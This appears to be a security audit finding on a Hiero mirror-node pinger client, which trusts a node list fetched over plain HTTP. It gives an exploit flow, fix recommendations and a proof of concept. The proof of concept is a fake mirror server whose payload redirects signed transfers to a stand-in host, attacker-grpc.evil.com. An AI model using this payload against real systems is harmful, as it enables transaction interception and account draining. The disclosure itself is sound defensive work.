### Title
Unauthenticated HTTP Mirror Node Response Enables Arbitrary Consensus-Node Injection in `newClient()`

### Summary
When `cfg.network == "other"`, `newClient()` calls `buildNetworkFromMirrorNodes()` which fetches the node list over a plain, unauthenticated HTTP connection with no TLS enforcement, no response signing, and no endpoint allowlist. An attacker who can MITM or spoof that HTTP response can inject a single attacker-controlled gRPC endpoint as the entire network map, causing `hiero.ClientForNetwork(netmap)` to route every signed transaction exclusively through the attacker's infrastructure. The "fee-maximizing" framing in the question is imprecise — Hiero fees are network-schedule-governed and cannot be inflated by a rogue node — but the actual impact (full transaction interception, operator key exposure via signed payloads, and account drain through forced retry fees) is concrete and exploitable.

### Finding Description

**Code path:**

`pinger/sdk_client.go` `newClient()` (lines 17–22) unconditionally passes the mirror-derived map to `hiero.ClientForNetwork`:

```go
netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
// ...
client = hiero.ClientForNetwork(netmap)
``` [1](#0-0) 

`pinger/mirror_node_client.go` `fetchMirrorNodeNetwork()` (lines 74–131) performs the HTTP fetch with a bare `http.Client` — no TLS requirement, no certificate pinning, no HMAC/signature verification on the response body:

```go
httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
// ...
req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
resp, err := httpClient.Do(req)
``` [2](#0-1) [3](#0-2) 

The only guard on the parsed response is a non-empty check:

```go
if len(network) == 0 {
    return nil, false, fmt.Errorf("no usable service_endpoints found from %s", url)
}
``` [4](#0-3) 

There is no IP/hostname allowlist, no account-ID cross-check against a known-good set, and no TLS enforcement. The `mirrorRest` URL is typically `http://mirror-rest:5551` (an in-cluster HTTP URL), making network-layer interception straightforward. [5](#0-4) 

**Root cause / failed assumption:** The code assumes the mirror REST endpoint is a trusted, integrity-protected source. It is not — it is an unauthenticated HTTP service, and its response is accepted verbatim.

**Exploit flow:**

1. Attacker positions themselves to intercept the HTTP GET to `http://<mirrorRest>/api/v1/network/nodes` (DNS poisoning, ARP spoofing on the same pod network, or a compromised mirror-rest service).
2. Attacker returns a crafted JSON body with one `nodeEntry` whose `service_endpoints` points to `attacker-grpc-proxy:50211` and a plausible `node_account_id` (e.g., `"0.0.3"`).
3. `fetchMirrorNodeNetwork` builds `map["attacker-grpc-proxy:50211"] = AccountID{0,0,3}` and returns it.
4. `hiero.ClientForNetwork(netmap)` creates a client with only the attacker's proxy as the sole consensus node.
5. Every `cryptoTransfer.Execute(client)` in `submitWithRetry` sends the fully-signed transaction (including operator account ID, destination, amount, and operator signature) to the attacker's gRPC endpoint. [6](#0-5) 

### Impact Explanation

- **Transaction interception**: The attacker receives every signed `CryptoTransfer` transaction. They can forward it to the real network (invisible MITM), drop it, or replay it.
- **Operator account drain via retries**: If the proxy drops or returns errors, `submitWithRetry` loops up to `cfg.maxRetries + 1` times per tick, and the ticker fires every `cfg.interval`. Each forwarded-then-failed attempt costs a real network fee. Over continuous operation this drains the operator account.
- **Privacy / key-usage exposure**: The attacker observes the operator's signing patterns, destination accounts, and transfer amounts on every tick.
- **Note on "fee maximization"**: Hiero fees are set by the network fee schedule and are identical across all nodes; a rogue node cannot inflate the per-transaction fee beyond the SDK's `maxTransactionFee`. The drain mechanism is retry-induced fee accumulation, not per-transaction fee inflation. [7](#0-6) 

### Likelihood Explanation

- The default `mirrorRest` URL is a plain `http://` in-cluster address. Any pod on the same Kubernetes network namespace, or any process with DNS write access, can intercept it without credentials.
- The pinger runs continuously (ticker-based), so the attacker's injected node persists for the entire lifetime of the process — `newClient()` is called once at startup and the resulting client is reused forever.
- No privileged access to the pinger pod or operator credentials is required; only network-layer access to the mirror REST HTTP port is needed. [8](#0-7) 

### Recommendation

1. **Enforce HTTPS** for `cfg.mirrorRest` and reject `http://` URLs at config validation time.
2. **Pin or validate node account IDs** against a compile-time or operator-supplied allowlist before inserting into `netmap`.
3. **Validate endpoint addresses** (IP ranges, port numbers) against an operator-configured allowlist so arbitrary hostnames cannot be injected.
4. **Re-fetch periodically with integrity checks** rather than trusting a single startup fetch for the process lifetime.
5. Consider using `hiero.ClientForName` for well-known networks and restricting `"other"` mode to environments where the mirror REST endpoint is TLS-authenticated.

### Proof of Concept

```
# 1. On a host that can intercept DNS for the pinger pod:
#    Redirect <mirrorRest hostname> to attacker machine.

# 2. Run a fake mirror REST HTTP server on attacker machine:
cat <<'EOF' > fake_mirror.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

PAYLOAD = {
  "nodes": [{
    "node_account_id": "0.0.3",
    "service_endpoints": [{"domain_name": "attacker-grpc.evil.com", "ip_address_v4": "", "port": 50211}],
    "grpc_proxy_endpoint": None
  }],
  "links": {"next": None}
}

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(PAYLOAD).encode()
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 5551), H).serve_forever()
EOF
python3 fake_mirror.py &

# 3. Run a gRPC listener on attacker-grpc.evil.com:50211 that logs
#    incoming CryptoTransfer protobuf bodies and optionally forwards them.

# 4. Start the pinger with network=other pointing at the fake mirror:
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://<attacker-ip>:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.1234 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# Result: every signed CryptoTransfer arrives at attacker-grpc.evil.com:50211.
# Dropping responses causes submitWithRetry to exhaust maxRetries each tick,
# accumulating fees on any attempts the proxy selectively forwards.
```
